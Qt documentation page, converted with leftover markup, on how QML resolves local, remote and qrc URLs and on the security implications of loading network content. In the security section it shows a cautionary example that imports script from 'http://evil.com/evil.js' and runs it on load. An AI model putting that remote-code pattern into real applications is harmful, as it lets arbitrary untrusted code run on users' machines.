QtQml.qtqml-documents-networktransparency
=========================================

.. raw:: html

   <p>

QML supports network transparency by using URLs (rather than file names)
for all references from a QML document to other content. This means that
anywhere a URL source is expected, QML can handle remote resources as
well as local ones, for example in the following image source:

.. raw:: html

   </p>

.. raw:: html

   <pre class="qml"><span class="type">Image</span> {
   <span class="name">source</span>: <span class="string">&quot;http://www.example.com/images/logo.png&quot;</span>
   }</pre>

.. raw:: html

   <p>

Since a relative URL is the same as a relative file, development of QML
on regular file systems remains simple:

.. raw:: html

   </p>

.. raw:: html

   <pre class="qml"><span class="type">Image</span> {
   <span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
   }</pre>

.. raw:: html

   <p>

Network transparency is supported throughout QML, for example:

.. raw:: html

   </p>

.. raw:: html

   <ul>

.. raw:: html

   <li>

Fonts - the source property of FontLoader is a URL

.. raw:: html

   </li>

.. raw:: html

   <li>

WebViews - the url property of WebView (obviously!)

.. raw:: html

   </li>

.. raw:: html

   </ul>

.. raw:: html

   <p>

Even QML types themselves can be on the network - if the Prototyping
with qmlscene is used to load http://example.com/mystuff/Hello.qml and
that content refers to a type "World", the engine will load
http://example.com/mystuff/qmldir and resolve the type just as it would
for a local file. For example if the qmldir file contains the line
"World World.qml", it will load http://example.com/mystuff/World.qml Any
other resources that Hello.qml referred to, usually by a relative URL,
would similarly be loaded from the network.

.. raw:: html

   </p>

.. raw:: html

   <h2 id="relative-vs-absolute-urls">

Relative vs. Absolute URLs

.. raw:: html

   </h2>

.. raw:: html

   <p>

Whenever an object has a property of type URL (QUrl), assigning a string
to that property will actually assign an absolute URL - by resolving the
string against the URL of the document where the string is used.

.. raw:: html

   </p>

.. raw:: html

   <p>

For example, consider this content in
http://example.com/mystuff/test.qml:

.. raw:: html

   </p>

.. raw:: html

   <pre class="qml"><span class="type">Image</span> {
   <span class="name">source</span>: <span class="string">&quot;images/logo.png&quot;</span>
   }</pre>

.. raw:: html

   <p>

The Image source property will be assigned
http://example.com/mystuff/images/logo.png, but while the QML is being
developed, in say
C::raw-latex:`\User`:raw-latex:`\Fred`:raw-latex:`\Documents`:raw-latex:`\MyStuff`:raw-latex:`\test`.qml,
it will be assigned
C::raw-latex:`\User`:raw-latex:`\Fred`:raw-latex:`\Documents`:raw-latex:`\MyStuff`:raw-latex:`\images`:raw-latex:`\logo`.png.

.. raw:: html

   </p>

.. raw:: html

   <p>

If the string assigned to a URL is already an absolute URL, then
"resolving" does not change it and the URL is assigned directly.

.. raw:: html

   </p>

.. raw:: html

   <h2 id="qrc-resources">

QRC Resources

.. raw:: html

   </h2>

.. raw:: html

   <p>

One of the URL schemes built into Qt is the "qrc" scheme. This allows
content to be compiled into the executable using The Qt Resource System.
Using this, an executable can reference QML content that is compiled
into the executable:

.. raw:: html

   </p>

.. raw:: html

   <pre class="cpp">    <span class="type">QQuickView</span> <span class="operator">*</span>view <span class="operator">=</span> <span class="keyword">new</span> <span class="type">QQuickView</span>;
   view<span class="operator">-</span><span class="operator">&gt;</span>setUrl(<span class="type">QUrl</span>(<span class="string">&quot;qrc:/dial.qml&quot;</span>));</pre>

.. raw:: html

   <p>

The content itself can then use relative URLs, and so be transparently
unaware that the content is compiled into the executable.

.. raw:: html

   </p>

.. raw:: html

   <h2 id="limitations">

Limitations

.. raw:: html

   </h2>

.. raw:: html

   <p>

The import statement is only network transparent if it has an "as"
clause.

.. raw:: html

   </p>

.. raw:: html

   <p>

More specifically:

.. raw:: html

   </p>

.. raw:: html

   <ul>

.. raw:: html

   <li>

import "dir" only works on local file systems

.. raw:: html

   </li>

.. raw:: html

   <li>

import libraryUri only works on local file systems

.. raw:: html

   </li>

.. raw:: html

   <li>

import "dir" as D works network transparently

.. raw:: html

   </li>

.. raw:: html

   <li>

import libraryUrl as U works network transparently

.. raw:: html

   </li>

.. raw:: html

   </ul>

.. raw:: html

   <h2 id="implications-for-application-security">

Implications for Application Security

.. raw:: html

   </h2>

.. raw:: html

   <p>

The QML security model is that QML content is a chain of trusted
content: the user installs QML content that they trust in the same way
as they install native Qt applications, or programs written with
runtimes such as Python and Perl. That trust is establish by any of a
number of mechanisms, including the availability of package signing on
some platforms.

.. raw:: html

   </p>

.. raw:: html

   <p>

In order to preserve the trust of users, QML application developers
should not load and execute arbitrary JavaScript or QML resources. For
example, consider the QML code below:

.. raw:: html

   </p>

.. raw:: html

   <pre class="qml">import QtQuick 2.0
   import &quot;http://evil.com/evil.js&quot; as Evil
   <span class="type"><a href="QtQml.Component.md">Component</a></span> {
   <span class="name">onLoaded</span>: <span class="name">Evil</span>.<span class="name">doEvil</span>()
   }</pre>

.. raw:: html

   <p>

This is equivalent to downloading and executing
"http://evil.com/evil.exe". The QML engine will not prevent particular
resources from being loaded. Unlike JavaScript code that is run within a
web browser, a QML application can load remote or local filesystem
resources in the same way as any other native applications, so
application developers must be careful in loading and executing any
content.

.. raw:: html

   </p>

.. raw:: html

   <p>

As with any application accessing other content beyond its control, a
QML application should perform appropriate checks on any untrusted data
it loads. Do not, for example, use import, Loader or XMLHttpRequest to
load any untrusted code or content.

.. raw:: html

   </p>

.. raw:: html

   <!-- @@@qtqml-documents-networktransparency.html -->
